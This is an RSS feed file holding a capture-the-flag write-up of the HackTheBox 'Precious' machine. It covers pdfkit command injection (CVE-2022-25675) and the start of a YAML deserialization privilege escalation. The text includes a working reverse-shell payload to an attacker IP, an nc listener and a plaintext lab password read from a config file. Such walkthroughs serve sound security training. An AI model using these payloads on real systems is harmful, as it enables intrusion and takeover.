@@ -1,0 +1,312 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ruby-Deserialization on</title><link>https://h4r1337.github.io/tags/ruby-deserialization/</link><description>Recent content in Ruby-Deserialization on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 03 Jun 2023 18:49:43 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/ruby-deserialization/index.xml" rel="self" type="application/rss+xml"/><item><title>Precious | HackTheBox</title><link>https://h4r1337.github.io/posts/precious/</link><pubDate>Sat, 03 Jun 2023 18:49:43 +0530</pubDate><guid>https://h4r1337.github.io/posts/precious/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/precious/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Precious">precious&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/27582">&lt;img src="https://www.hackthebox.com/badge/image/27582" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Precious
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>In this easy machine we will exploit a critical RCE vulnerability in a PDF document generation library for ruby to gain initial access on the machine as the ruby user. And from there we will do a lateral movement to another user by using exposed plain text password. After that we will perform privilege escalation to root user by exploiting another vulnerability in a ruby function which is a deserialization RCE in &lt;code>YAML.load()&lt;/code> function.&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/precious/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Precious">precious&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/27582">&lt;img src="https://www.hackthebox.com/badge/image/27582" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Precious
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>In this easy machine we will exploit a critical RCE vulnerability in a PDF document generation library for ruby to gain initial access on the machine as the ruby user. And from there we will do a lateral movement to another user by using exposed plain text password. After that we will perform privilege escalation to root user by exploiting another vulnerability in a ruby function which is a deserialization RCE in &lt;code>YAML.load()&lt;/code> function.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Initial script and service scan:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> nmap -sC -sV 10.10.11.189 -oA nmap/initial
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> precious.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.189&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#fe8019">(&lt;/span>0.57s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">998&lt;/span> closed ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 &lt;span style="color:#fe8019">(&lt;/span>protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http nginx 1.18.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-server-header:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| nginx/1.18.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ nginx/1.18.0 + Phusion Passenger&lt;span style="color:#fe8019">(&lt;/span>R&lt;span style="color:#fe8019">)&lt;/span> 6.0.15
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Convert Web Page to PDF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="port-80---http-nginx-1180">Port 80 - HTTP (Nginx 1.18.0)&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/precious/port-80.webp">&lt;/figure>
+&lt;p>First I thought of SSRF but there is no response when we enter a url, and it throws an error &lt;code>Cannot load remote URL!&lt;/code>. Url without http or https also throws an error &lt;code>You should provide a valid URL!&lt;/code>&lt;/p>
+&lt;p>But when we append ` character at the end of a url it generates an empty pdf file.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> file k2kl1ovlfap1dqeyt0ndt0bfucqbmw0c.pdf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k2kl1ovlfap1dqeyt0ndt0bfucqbmw0c.pdf: PDF document, version 1.4, &lt;span style="color:#d3869b">1&lt;/span> pages
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exiftool k2kl1ovlfap1dqeyt0ndt0bfucqbmw0c.pdf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ExifTool Version Number : 12.40
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Name : k2kl1ovlfap1dqeyt0ndt0bfucqbmw0c.pdf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Directory : .
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Size : 4.5 KiB
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Modification Date/Time : 2023:01:19 09:11:06+05:30
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Access Date/Time : 2023:01:19 09:11:06+05:30
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Inode Change Date/Time : 2023:01:19 09:12:30+05:30
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Permissions : -rw-rw-r--
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Type : PDF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Type Extension : pdf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MIME Type : application/pdf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PDF Version : 1.4
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Linearized : No
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Page Count : &lt;span style="color:#d3869b">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Creator : Generated by pdfkit v0.8.6
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After inspecting the pdf file, we can see that it is generated by &lt;code>pdfkit v0.8.6&lt;/code> and this version of &lt;code>pdfkit&lt;/code> is vulnerable to &lt;a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">command injection&lt;/a>
+We can also see that &lt;code>pdfkit&lt;/code> is a package used in generating PDF documents available for ruby.&lt;/p>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="command-injection-on-pdfkit-v086-cve-2022-25675">Command Injection on &lt;code>pdfkit v0.8.6&lt;/code> (CVE-2022-25675)&lt;/h3>
+&lt;blockquote>
+&lt;p>An application could be vulnerable if it tries to render a URL that contains query string parameters with user input:&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">PDFKit&lt;/span>&lt;span style="color:#fe8019">.&lt;/span>new(&lt;span style="color:#b8bb26">&amp;#34;http://example.com/?name=&lt;/span>&lt;span style="color:#b8bb26">#{&lt;/span>params&lt;span style="color:#fe8019">[&lt;/span>&lt;span style="color:#83a598">:name&lt;/span>&lt;span style="color:#fe8019">]&lt;/span>&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>)&lt;span style="color:#fe8019">.&lt;/span>to_pdf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If the provided parameter happens to contain a URL encoded character and a shell command substitution string, it will be included in the command that PDFKit executes to render the PDF:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>irb(main):&lt;span style="color:#d3869b">060&lt;/span>:&lt;span style="color:#d3869b">0&lt;/span>&lt;span style="color:#fe8019">&amp;gt;&lt;/span> &lt;span style="color:#fabd2f">puts&lt;/span> &lt;span style="color:#d3869b">PDFKit&lt;/span>&lt;span style="color:#fe8019">.&lt;/span>new(&lt;span style="color:#b8bb26">&amp;#34;http://example.com/?name=&lt;/span>&lt;span style="color:#b8bb26">#{&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;%20`sleep 5`&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>)&lt;span style="color:#fe8019">.&lt;/span>command
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wkhtmltopdf &lt;span style="color:#fe8019">--&lt;/span>quiet &lt;span style="color:#fe8019">[...]&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;http://example.com/?name=%20`sleep 5`&amp;#34;&lt;/span> &lt;span style="color:#fe8019">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#fe8019">nil&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Calling &lt;code>to_pdf&lt;/code> on the instance shows that the &lt;code>sleep&lt;/code> command is indeed executing:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>PDFKit.new(&amp;#34;http://example.com/?name=#{&amp;#39;%20`sleep 5`&amp;#39;}&amp;#34;).to_pdf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span># 5 seconds wait...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Of course, if the user can control completely the first argument of the PDFKit constructor, they can also exploit the command injection as long as it starts with &amp;ldquo;http&amp;rdquo;:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>PDFKit.new(&amp;#34;http%20`sleep 5`&amp;#34;).to_pdf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So we can add a reverse shell and gain initial access.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>http://example.com/?name&lt;span style="color:#fe8019">={&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;%20`ruby -rsocket -e&amp;#39;&lt;/span>spawn&lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;sh&amp;#34;&lt;/span>,&lt;span style="color:#fe8019">[&lt;/span>:in,:out,:err&lt;span style="color:#fe8019">]=&lt;/span>&amp;gt;TCPSocket.new&lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;10.10.14.10&amp;#34;&lt;/span>,1234&lt;span style="color:#fe8019">))&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;`&amp;#39;&lt;/span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># nc listener&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nc -lnvp &lt;span style="color:#d3869b">1234&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Listening on 0.0.0.0 &lt;span style="color:#d3869b">1234&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection received on 10.10.11.189 &lt;span style="color:#d3869b">46174&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ruby
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#fe8019">=&lt;/span>1001&lt;span style="color:#fe8019">(&lt;/span>ruby&lt;span style="color:#fe8019">)&lt;/span> gid&lt;span style="color:#fe8019">=&lt;/span>1001&lt;span style="color:#fe8019">(&lt;/span>ruby&lt;span style="color:#fe8019">)&lt;/span> groups&lt;span style="color:#fe8019">=&lt;/span>1001&lt;span style="color:#fe8019">(&lt;/span>ruby&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="lateral-movement-to-henry">Lateral Movement to &lt;code>henry&lt;/code>&lt;/h2>
+&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">cd&lt;/span> ~
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ls -alp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#d3869b">28&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#d3869b">4&lt;/span> ruby ruby &lt;span style="color:#d3869b">4096&lt;/span> Jan &lt;span style="color:#d3869b">19&lt;/span> 00:50 ./
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#d3869b">4&lt;/span> root root &lt;span style="color:#d3869b">4096&lt;/span> Oct &lt;span style="color:#d3869b">26&lt;/span> 08:28 ../
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lrwxrwxrwx &lt;span style="color:#d3869b">1&lt;/span> root root &lt;span style="color:#d3869b">9&lt;/span> Oct &lt;span style="color:#d3869b">26&lt;/span> 07:53 .bash_history -&amp;gt; /dev/null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#d3869b">1&lt;/span> ruby ruby &lt;span style="color:#d3869b">220&lt;/span> Mar &lt;span style="color:#d3869b">27&lt;/span> &lt;span style="color:#d3869b">2022&lt;/span> .bash_logout
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#d3869b">1&lt;/span> ruby ruby &lt;span style="color:#d3869b">3526&lt;/span> Mar &lt;span style="color:#d3869b">27&lt;/span> &lt;span style="color:#d3869b">2022&lt;/span> .bashrc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dr-xr-xr-x &lt;span style="color:#d3869b">2&lt;/span> root ruby &lt;span style="color:#d3869b">4096&lt;/span> Oct &lt;span style="color:#d3869b">26&lt;/span> 08:28 .bundle/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#d3869b">3&lt;/span> ruby ruby &lt;span style="color:#d3869b">4096&lt;/span> Jan &lt;span style="color:#d3869b">19&lt;/span> 00:50 .cache/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#d3869b">1&lt;/span> ruby ruby &lt;span style="color:#d3869b">807&lt;/span> Mar &lt;span style="color:#d3869b">27&lt;/span> &lt;span style="color:#d3869b">2022&lt;/span> .profile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ls -alp .bundle
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#d3869b">12&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dr-xr-xr-x &lt;span style="color:#d3869b">2&lt;/span> root ruby &lt;span style="color:#d3869b">4096&lt;/span> Oct &lt;span style="color:#d3869b">26&lt;/span> 08:28 ./
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#d3869b">4&lt;/span> ruby ruby &lt;span style="color:#d3869b">4096&lt;/span> Jan &lt;span style="color:#d3869b">19&lt;/span> 00:50 ../
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-r-xr-xr-x &lt;span style="color:#d3869b">1&lt;/span> root ruby &lt;span style="color:#d3869b">62&lt;/span> Sep &lt;span style="color:#d3869b">26&lt;/span> 05:04 config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat .bundle/config
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>BUNDLE_HTTPS://RUBYGEMS__ORG/: &lt;span style="color:#b8bb26">&amp;#34;henry:Q3c1AqGHtoI0aXAYFH&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After some enumeration in the home directory of user &lt;code>ruby&lt;/code> I got the password for user &lt;code>henry&lt;/code>.&lt;/p>
+&lt;h3 id="lateral-movement-vector">Lateral Movement vector&lt;/h3>
+&lt;p>Now we can either use SSH to login to the user &lt;code>henry&lt;/code> or just use &lt;code>su henry&lt;/code> and enter the password. Though SSH will be the best way because we will get a proper bash shell instead of the restricted nc shell.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> ssh henry@10.10.11.189
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@10.10.11.189s password:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Linux precious 5.10.0-19-amd64 &lt;span style="color:#928374;font-style:italic">#1 SMP Debian 5.10.149-2 (2022-10-21) x86_64&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>The programs included with the Debian GNU/Linux system are free software;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>the exact distribution terms &lt;span style="color:#fe8019">for&lt;/span> each program are described in the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>individual files in /usr/share/doc/*/copyright.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>permitted by applicable law.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@precious:~$ whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@precious:~$ id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>henry&lt;span style="color:#fe8019">)&lt;/span> gid&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>henry&lt;span style="color:#fe8019">)&lt;/span> groups&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>henry&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@precious:~$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="local-enumeration-1">Local Enumeration&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>henry@precious:~$ sudo -l
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Matching Defaults entries &lt;span style="color:#fe8019">for&lt;/span> henry on precious:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> env_reset, mail_badpass, secure_path&lt;span style="color:#fe8019">=&lt;/span>/usr/local/sbin&lt;span style="color:#b8bb26">\:&lt;/span>/usr/local/bin&lt;span style="color:#b8bb26">\:&lt;/span>/usr/sbin&lt;span style="color:#b8bb26">\:&lt;/span>/usr/bin&lt;span style="color:#b8bb26">\:&lt;/span>/sbin&lt;span style="color:#b8bb26">\:&lt;/span>/bin
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User henry may run the following commands on precious:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can run &lt;code>update_dependencies.rb&lt;/code> script as root.&lt;/p>
+&lt;p>&lt;code>update_dependencies.rb&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Compare installed dependencies with those specified in &amp;#34;dependencies.yml&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">require&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;yaml&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">require&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;rubygems&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># TODO: update versions automatically&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">update_gems&lt;/span>()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">list_from_file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d3869b">YAML&lt;/span>&lt;span style="color:#fe8019">.&lt;/span>load(&lt;span style="color:#d3869b">File&lt;/span>&lt;span style="color:#fe8019">.&lt;/span>read(&lt;span style="color:#b8bb26">&amp;#34;dependencies.yml&amp;#34;&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">list_local_gems&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d3869b">Gem&lt;/span>&lt;span style="color:#fe8019">::&lt;/span>&lt;span style="color:#d3869b">Specification&lt;/span>&lt;span style="color:#fe8019">.&lt;/span>sort_by{ &lt;span style="color:#fe8019">|&lt;/span>g&lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#fe8019">[&lt;/span>g&lt;span style="color:#fe8019">.&lt;/span>name&lt;span style="color:#fe8019">.&lt;/span>downcase, g&lt;span style="color:#fe8019">.&lt;/span>version&lt;span style="color:#fe8019">]&lt;/span> }&lt;span style="color:#fe8019">.&lt;/span>map{&lt;span style="color:#fe8019">|&lt;/span>g&lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#fe8019">[&lt;/span>g&lt;span style="color:#fe8019">.&lt;/span>name, g&lt;span style="color:#fe8019">.&lt;/span>version&lt;span style="color:#fe8019">.&lt;/span>to_s&lt;span style="color:#fe8019">]&lt;/span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gems_file &lt;span style="color:#fe8019">=&lt;/span> list_from_file
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gems_local &lt;span style="color:#fe8019">=&lt;/span> list_local_gems
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gems_file&lt;span style="color:#fe8019">.&lt;/span>each &lt;span style="color:#fe8019">do&lt;/span> &lt;span style="color:#fe8019">|&lt;/span>file_name, file_version&lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gems_local&lt;span style="color:#fe8019">.&lt;/span>each &lt;span style="color:#fe8019">do&lt;/span> &lt;span style="color:#fe8019">|&lt;/span>local_name, local_version&lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span>(file_name &lt;span style="color:#fe8019">==&lt;/span> local_name)
